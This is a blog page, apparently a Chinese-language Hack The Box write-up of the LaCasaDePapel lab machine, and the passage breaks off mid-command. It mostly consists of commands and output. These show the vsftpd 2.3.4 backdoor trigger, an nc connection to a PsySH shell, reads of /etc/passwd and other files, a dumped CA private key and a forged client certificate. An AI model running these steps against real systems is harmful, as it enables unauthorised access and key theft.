@@ -1,0 +1,819 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="privilege_escalation,LFI,ssl,psysh,php_function,symblink,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="简介靶机状态: rooted.">
+<meta name="keywords" content="privilege_escalation,LFI,ssl,psysh,php_function,symblink">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB linux LaCasaDePapel">
+<meta property="og:url" content="https://exexute.github.io/2019/07/04/HTB-linux-LaCasaDePapel/index.html">
+<meta property="og:site_name" content="owefsad 的博客">
+<meta property="og:description" content="简介靶机状态: rooted.">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2022-06-24T14:37:07.860Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="HTB linux LaCasaDePapel">
+<meta name="twitter:description" content="简介靶机状态: rooted.">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://exexute.github.io/2019/07/04/HTB-linux-LaCasaDePapel/">
+
+
+
+
+
+  <title>HTB linux LaCasaDePapel | owefsad 的博客</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?2a72b138b6ef81ae123fcd18e91fa843";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">owefsad 的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://exexute.github.io/2019/07/04/HTB-linux-LaCasaDePapel/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="owefsad">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="owefsad 的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">HTB linux LaCasaDePapel</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-04T22:07:26+08:00">
+                2019-07-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>简介<br>靶机状态: rooted.</p>
+<a id="more"></a>
+<h2 id="文章目录"><a href="#文章目录" class="headerlink" title="文章目录"></a>文章目录</h2><ul>
+<li>nmap&amp;&amp;vsftpd&amp;&amp;backdoor</li>
+<li>Client Authentication Certificate</li>
+<li>Symblink</li>
+</ul>
+<blockquote>
+<p>nmap&amp;&amp;vsftpd&amp;&amp;backdoor</p>
+</blockquote>
+<p>nmap扫描端口，发现vsftpd、OpenSSH、Nodejs；起初一位是vsftpd后门+nodejs deserialize RCE 实现getshell；结果大相径庭。</p>
+<h4 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h4><p>info: </p>
+<ul>
+<li>vsftpd 2.3.4 backdoor</li>
+<li>OpenSSH 7.9</li>
+<li>Node.js(80, 443)</li>
+<li>SSL(ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"># Nmap 7.70 scan initiated Sun Jun 23 17:41:20 2019 as: nmap -sC -sV -oA LaCasaDePapel 10.10.10.131</span><br><span class="line">Nmap scan report for 10.10.10.131</span><br><span class="line">Host is up (0.48s latency).</span><br><span class="line">Not shown: 996 closed ports</span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">21/tcp  open  ftp      vsftpd 2.3.4</span><br><span class="line">22/tcp  open  ssh      OpenSSH 7.9 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 03:e1:c2:c9:79:1c:a6:6b:51:34:8d:7a:c3:c7:c8:50 (RSA)</span><br><span class="line">|   256 41:e4:95:a3:39:0b:25:f9:da:de:be:6a:dc:59:48:6d (ECDSA)</span><br><span class="line">|_  256 30:0b:c6:66:2b:8f:5e:4f:26:28:75:0e:f5:b1:71:e4 (ED25519)</span><br><span class="line">80/tcp  open  http     Node.js (Express middleware)</span><br><span class="line">|_http-title: La Casa De Papel</span><br><span class="line">443/tcp open  ssl/http Node.js Express framework</span><br><span class="line">| http-auth:</span><br><span class="line">| HTTP/1.1 401 Unauthorized\x0D</span><br><span class="line">|_  Server returned status 401 but no WWW-Authenticate header.</span><br><span class="line">| ssl-cert: Subject: commonName=lacasadepapel.htb/organizationName=La Casa De Papel</span><br><span class="line">| Not valid before: 2019-01-27T08:35:30</span><br><span class="line">|_Not valid after:  2029-01-24T08:35:30</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| tls-alpn:</span><br><span class="line">|_  http/1.1</span><br><span class="line">| tls-nextprotoneg:</span><br><span class="line">|   http/1.1</span><br><span class="line">|_  http/1.0</span><br><span class="line">Service Info: OS: Unix</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line"># Nmap done at Sun Jun 23 17:44:43 2019 -- 1 IP address (1 host up) scanned in 203.65 seconds</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h4 id="ftp-backdoor"><a href="#ftp-backdoor" class="headerlink" title="ftp backdoor"></a>ftp backdoor</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ ftp 10.10.10.131</span><br><span class="line">Connected to 10.10.10.131.</span><br><span class="line">220 (vsFTPd 2.3.4)</span><br><span class="line">Name (10.10.10.131:owefsad): owefsad:)</span><br><span class="line">331 Please specify the password.</span><br><span class="line">Password:&lt;enter anything and <span class="built_in">type</span> enter&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># get the backdoor</span></span><br><span class="line">$ nc 10.10.10.131 6200</span><br><span class="line">Psy Shell v0.9.9 (PHP 7.2.10 — cli) by Justin Hileman</span><br></pre></td></tr></table></figure>
+<p>psysh简介：</p>
+<p>psy利用：<br>通过help列命令，查看命令的功能和用法；结合ls查看当前的变量和环境信息；然后借助PHP function读取文件内容获取服务器端https证书私钥。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">ls -la</span><br><span class="line">Variables:</span><br><span class="line">  $tokyo     Tokyo &#123;<span class="comment">#2307&#125;</span></span><br><span class="line">  $_         <span class="keyword">null</span></span><br><span class="line">  $_e        Symfony\Component\Console\<span class="keyword">Exception</span>\RuntimeException &#123;<span class="comment">#2316 …3&#125;</span></span><br><span class="line">  $__class   <span class="string">"Tokyo"</span></span><br><span class="line">  $__file    <span class="string">"/home/dali/.config/psysh/tokyo.php"</span></span><br><span class="line">  $__line    <span class="number">2</span></span><br><span class="line">  $__dir     <span class="string">"/home/dali/.config/psysh"</span></span><br></pre></td></tr></table></figure></p>
+<!--
+中间尝试数据记录:
+wtf -a
+--
+ 0:  () at phar:///usr/bin/psysh/src/Command/ReflectingCommand.php:160
+ 1:  Psy\Command\ReflectingCommand->resolveCode() at phar:///usr/bin/psysh/src/Command/DumpCommand.php:73
+ 2:  Psy\Command\DumpCommand->execute() at phar:///usr/bin/psysh/vendor/symfony/console/Command/Command.php:264
+ 3:  Symfony\Component\Console\Command\Command->run() at phar:///usr/bin/psysh/src/Shell.php:803
+ 4:  Psy\Shell->runCommand() at phar:///usr/bin/psysh/src/Shell.php:405
+ 5:  Psy\Shell->getInput() at phar:///usr/bin/psysh/src/ExecutionLoopClosure.php:40
+ 6:  Psy\{closure}() at phar:///usr/bin/psysh/src/ExecutionClosure.php:101
+ 7:  Psy\ExecutionClosure->execute() at phar:///usr/bin/psysh/src/ExecutionLoop.php:33
+ 8:  Psy\ExecutionLoop->run() at phar:///usr/bin/psysh/src/Shell.php:351
+ 9:  Psy\Shell->doRun() at phar:///usr/bin/psysh/vendor/symfony/console/Application.php:130
+10:  Symfony\Component\Console\Application->run() at phar:///usr/bin/psysh/src/Shell.php:316
+11:  Psy\Shell->run() at phar:///usr/bin/psysh/src/functions.php:346
+12:  Psy\{closure}() at usr/bin/psysh:145
+-->
+<p>通过php函数file_get_contents读取文件内容（”echo file_get_contents(“/etc/passwd”);”），之后发现require函数可用；通过用require包含本地文件<code>require(&quot;/etc/passwd&quot;)</code>，读取用户信息: root、operator、postgres、dali、berlin、professor;<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">require(<span class="string">"/etc/passwd"</span>)</span><br><span class="line">root:x:0:0:root:/root:/bin/ash</span><br><span class="line">bin:x:1:1:bin:/bin:/sbin/nologin</span><br><span class="line">daemon:x:2:2:daemon:/sbin:/sbin/nologin</span><br><span class="line">adm:x:3:4:adm:/var/adm:/sbin/nologin</span><br><span class="line">lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin</span><br><span class="line">sync:x:5:0:sync:/sbin:/bin/sync</span><br><span class="line">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span><br><span class="line">halt:x:7:0:halt:/sbin:/sbin/halt</span><br><span class="line">mail:x:8:12:mail:/var/spool/mail:/sbin/nologin</span><br><span class="line">news:x:9:13:news:/usr/lib/news:/sbin/nologin</span><br><span class="line">uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin</span><br><span class="line">operator:x:11:0:operator:/root:/bin/sh</span><br><span class="line">man:x:13:15:man:/usr/man:/sbin/nologin</span><br><span class="line">postmaster:x:14:12:postmaster:/var/spool/mail:/sbin/nologin</span><br><span class="line">cron:x:16:16:cron:/var/spool/cron:/sbin/nologin</span><br><span class="line">ftp:x:21:21::/var/lib/ftp:/sbin/nologin</span><br><span class="line">sshd:x:22:22:sshd:/dev/null:/sbin/nologin</span><br><span class="line">at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin</span><br><span class="line">squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin</span><br><span class="line">xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin</span><br><span class="line">games:x:35:35:games:/usr/games:/sbin/nologin</span><br><span class="line">postgres:x:70:70::/var/lib/postgresql:/bin/sh</span><br><span class="line">cyrus:x:85:12::/usr/cyrus:/sbin/nologin</span><br><span class="line">vpopmail:x:89:89::/var/vpopmail:/sbin/nologin</span><br><span class="line">ntp:x:123:123:NTP:/var/empty:/sbin/nologin</span><br><span class="line">smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin</span><br><span class="line">guest:x:405:100:guest:/dev/null:/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/:/sbin/nologin</span><br><span class="line">chrony:x:100:101:chrony:/var/<span class="built_in">log</span>/chrony:/sbin/nologin</span><br><span class="line">dali:x:1000:1000:dali,,,:/home/dali:/usr/bin/psysh</span><br><span class="line">berlin:x:1001:1001:berlin,,,:/home/berlin:/bin/ash</span><br><span class="line">professor:x:1002:1002:professor,,,:/home/professor:/bin/ash</span><br><span class="line">vsftp:x:101:21:vsftp:/var/lib/ftp:/sbin/nologin</span><br><span class="line">memcached:x:102:102:memcached:/home/memcached:/sbin/nologin</span><br></pre></td></tr></table></figure></p>
+<p>通过require读取/etc/shadow文件和读取/etc/owef文件做测试发现, 如果reqiire的返回结果是没有权限, 说明文件存在但是当前用户没有查看权限; 如果返回Fail opening, 说明文件不存在; 如下:<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 读取存在的文件</span></span><br><span class="line">require(<span class="string">"/home/berlin/user.txt"</span>)</span><br><span class="line">PHP Warning:  Uncaught Psy\Exception\ErrorException: PHP Warning:  require(/home/berlin/user.txt): failed to open stream: Permission denied <span class="keyword">in</span> phar:///usr/bin/psysh/src/ExecutionLoopClosure.php(55) : <span class="built_in">eval</span>()<span class="string">'d code on line 1 in phar:///usr/bin/psysh/src/ExecutionLoopClosure.php(55) : eval()'</span>d code:1</span><br><span class="line">Stack trace:</span><br><span class="line"><span class="comment">#0 phar:///usr/bin/psysh/src/Shell.php(1130): Psy\Exception\ErrorException::throwException(2, 'require(/home/b...', 'phar:///usr/bin...', 1)</span></span><br><span class="line"><span class="comment">#1 phar:///usr/bin/psysh/src/ExecutionLoopClosure.php(55) : eval()'d code(1): Psy\Shell-&gt;handleError(2, 'require(/home/b...', 'phar:///usr/bin...', 1, Array)</span></span><br><span class="line"><span class="comment">#2 phar:///usr/bin/psysh/src/ExecutionLoopClosure.php(55) : eval()'d code(1): require()</span></span><br><span class="line"><span class="comment">#3 phar:///usr/bin/psysh/src/ExecutionLoopClosure.php(55): eval()</span></span><br><span class="line"><span class="comment">#4 phar:///usr/bin/psysh/src/ExecutionClosure.php(101): Psy\&#123;closure&#125;()</span></span><br><span class="line"><span class="comment">#5 phar:///usr/bin/psysh/src/ExecutionLoop.php(33): Psy\ExecutionClosure-&gt;execute()</span></span><br><span class="line"><span class="comment">#6 phar:///usr/bin/psysh/src/Shell.php(351): Psy\ExecutionLoop-&gt;run(Object(Psy\Shell))</span></span><br><span class="line"><span class="comment">#7 phar:///usr/bin/psysh/vend in phar:///usr/bin/psysh/src/ExecutionLoopClosure.php(55) : eval()'d code on line 1</span></span><br><span class="line">PHP Fatal error:  Unknown: Failed opening required <span class="string">'/home/berlin/user.txt'</span> (include_path=<span class="string">'.:/usr/share/php7'</span>) <span class="keyword">in</span> phar:///usr/bin/psysh/src/ExecutionLoopClosure.php(55) : <span class="built_in">eval</span>()<span class="string">'d code on line 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 读取不存在的文件</span></span><br><span class="line"><span class="string">require("/home/berlin/a.txt")</span></span><br><span class="line"><span class="string">PHP Fatal error:  Failed opening required '</span>/home/berlin/a.txt<span class="string">' in Psy Shell code on line 1</span></span><br></pre></td></tr></table></figure></p>
+<p>于是, 在berlin用户的home目录中找到user.txt, 尝试逃逸psy shell然后提权至其他berlin用户读取user.txt结果失败；</p>
+<blockquote>
+<p>Client Authentication Certificate</p>
+</blockquote>
+<p>访问https时，页面返回证书错误的信息，结合上一步中找到的psy读取文件，从nairobi的home目录中读取到ca.key，利用服务器端私钥创建客户端证书访问https，利用https的LFI读取nairobi用户的ssh key；利用nairobi的ssh登陆professor用户。</p>
+<h4 id="read-ca-key"><a href="#read-ca-key" class="headerlink" title="read ca.key"></a>read ca.key</h4><p>由于上一步信息收集不到位，因此这里又重新收集了一遍信息，通过<code>ls -la</code>查看当前环境信息和变量信息之后，利用file_get_contents函数读取“/home/dali/.config/psysh/tokyo.php”文件内容，从文件中获取到创建客户端证书的代码和服务器端key：</p>
+<p>php file_get_contents()函数读取”/home/dali/.config/psysh/tokyo.php”文件内容，如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tokyo</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sign</span><span class="params">($caCert,$userCsr)</span> </span>&#123;</span><br><span class="line">		$caKey = file_get_contents(<span class="string">'/home/nairobi/ca.key'</span>);</span><br><span class="line">		$userCert = openssl_csr_sign($userCsr, $caCert, $caKey, <span class="number">365</span>, [<span class="string">'digest_alg'</span>=&gt;<span class="string">'sha256'</span>]);</span><br><span class="line">		openssl_x509_export($userCert, $userCertOut);</span><br><span class="line">		<span class="keyword">return</span> $userCertOut;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$tokyo = <span class="keyword">new</span> Tokyo;</span><br></pre></td></tr></table></figure></p>
+<p>分析Tokyo类可知，该类用于通过服务器端证书文件和证书公钥创建客户端证书的；于是，先利用file_get_contents函数读取ca.key文件的内容：<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">-----BEGIN PRIVATE KEY-----</span><br><span class="line">MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDPczpU3s4Pmwdb</span><br><span class="line">7MJsi//m8mm5rEkXcDmratVAk2pTWwWxudo/FFsWAC1zyFV4w2KLacIU7w8Yaz0/</span><br><span class="line">2m+jLx7wNH2SwFBjJeo5lnz+ux3HB+NhWC/5rdRsk07h71J3dvwYv7hcjPNKLcRl</span><br><span class="line">uXt2Ww6GXj4oHhwziE2ETkHgrxQp7jB8pL96SDIJFNEQ1Wqp3eLNnPPbfbLLMW8M</span><br><span class="line">YQ4UlXOaGUdXKmqx9L2spRURI8dzNoRCV3eS6lWu3+YGrC4p732yW5DM5Go7XEyp</span><br><span class="line">s2BvnlkPrq9AFKQ3Y/AF6JE8FE1d+daVrcaRpu6Sm73FH2j6Xu63Xc9d1D989+Us</span><br><span class="line">PCe7nAxnAgMBAAECggEAagfyQ5jR58YMX97GjSaNeKRkh4NYpIM25renIed3C/3V</span><br><span class="line">Dj75Hw6vc7JJiQlXLm9nOeynR33c0FVXrABg2R5niMy7djuXmuWxLxgM8UIAeU89</span><br><span class="line">1+50LwC7N3efdPmWw/rr5VZwy9U7MKnt3TSNtzPZW7JlwKmLLoe3Xy2EnGvAOaFZ</span><br><span class="line">/CAhn5+pxKVw5c2e1Syj9K23/BW6l3rQHBixq9Ir4/QCoDGEbZL17InuVyUQcrb+</span><br><span class="line">q0rLBKoXObe5esfBjQGHOdHnKPlLYyZCREQ8hclLMWlzgDLvA/8pxHMxkOW8k3Mr</span><br><span class="line">uaug9prjnu6nJ3v1ul42NqLgARMMmHejUPry/d4oYQKBgQDzB/gDfr1R5a2phBVd</span><br><span class="line">I0wlpDHVpi+K1JMZkayRVHh+sCg2NAIQgapvdrdxfNOmhP9+k3ue3BhfUweIL9Og</span><br><span class="line">7MrBhZIRJJMT4yx/2lIeiA1+oEwNdYlJKtlGOFE+T1npgCCGD4hpB+nXTu9Xw2bE</span><br><span class="line">G3uK1h6Vm12IyrRMgl/OAAZwEQKBgQDahTByV3DpOwBWC3Vfk6wqZKxLrMBxtDmn</span><br><span class="line">sqBjrd8pbpXRqj6zqIydjwSJaTLeY6Fq9XysI8U9C6U6sAkd+0PG6uhxdW4++mDH</span><br><span class="line">CTbdwePMFbQb7aKiDFGTZ+xuL0qvHuFx3o0pH8jT91C75E30FRjGquxv+75hMi6Y</span><br><span class="line">sm7+mvMs9wKBgQCLJ3Pt5GLYgs818cgdxTkzkFlsgLRWJLN5f3y01g4MVCciKhNI</span><br><span class="line">ikYhfnM5CwVRInP8cMvmwRU/d5Ynd2MQkKTju+xP3oZMa9Yt+r7sdnBrobMKPdN2</span><br><span class="line">zo8L8vEp4VuVJGT6/efYY8yUGMFYmiy8exP5AfMPLJ+Y1J/58uiSVldZUQKBgBM/</span><br><span class="line">ukXIOBUDcoMh3UP/ESJm3dqIrCcX9iA0lvZQ4aCXsjDW61EOHtzeNUsZbjay1gxC</span><br><span class="line">9amAOSaoePSTfyoZ8R17oeAktQJtMcs2n5OnObbHjqcLJtFZfnIarHQETHLiqH9M</span><br><span class="line">WGjv+NPbLExwzwEaPqV5dvxiU6HiNsKSrT5WTed/AoGBAJ11zeAXtmZeuQ95eFbM</span><br><span class="line">7b75PUQYxXRrVNluzvwdHmZEnQsKucXJ6uZG9skiqDlslhYmdaOOmQajW3yS4TsR</span><br><span class="line">aRklful5+Z60JV/5t2Wt9gyHYZ6SYMzApUanVXaWCCNVoeq+yvzId0st2DRl83Vc</span><br><span class="line">53udBEzjt3WPqYGkkDknVhjD</span><br><span class="line">-----END PRIVATE KEY-----</span><br></pre></td></tr></table></figure></p>
+<p>创建客户端证书访问https<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># python触发vsftp 2.3.4 backdoor</span></span><br><span class="line">$ python -c <span class="string">"from ftplib import FTP;ftp = FTP(host='10.10.10.131', user='owef:)', passwd='123');ftp.login()"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># openssl创建客户端证书</span></span><br><span class="line">$ openssl req -newkey rsa:2048 -keyout owef_key.pem -out owef_csr.pem -nodes -days 365 -subj <span class="string">"/CN=Owefsad"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 在psysh中用服务器端证书创建客户端证书</span></span><br><span class="line"><span class="variable">$caKey</span> = file_get_contents(<span class="string">'/home/nairobi/ca.key'</span>);</span><br><span class="line"><span class="variable">$caCert</span> = file_get_contents(<span class="string">"http://10.10.15.45/lacasadepapel.htb.crt"</span>);</span><br><span class="line"><span class="variable">$userCsr</span> = file_get_contents(<span class="string">"http://10.10.15.45/owef_csr.pem"</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$userCert</span> = openssl_csr_sign(<span class="variable">$userCsr</span>, <span class="variable">$caCert</span>, <span class="variable">$caKey</span>, 365, [<span class="string">'digest_alg'</span>=&gt;<span class="string">'sha256'</span>]);</span><br><span class="line"><span class="variable">$openssl_x509_export</span>(<span class="variable">$userCert</span>, <span class="variable">$userCrt</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将$userCrt内容保存至owef_cert.pem</span></span><br><span class="line">$ <span class="built_in">echo</span> <span class="variable">$userCrt</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用owef的私钥和服务器端签名的cert导出p12格式的证书</span></span><br><span class="line">$ openssl pkcs12 -<span 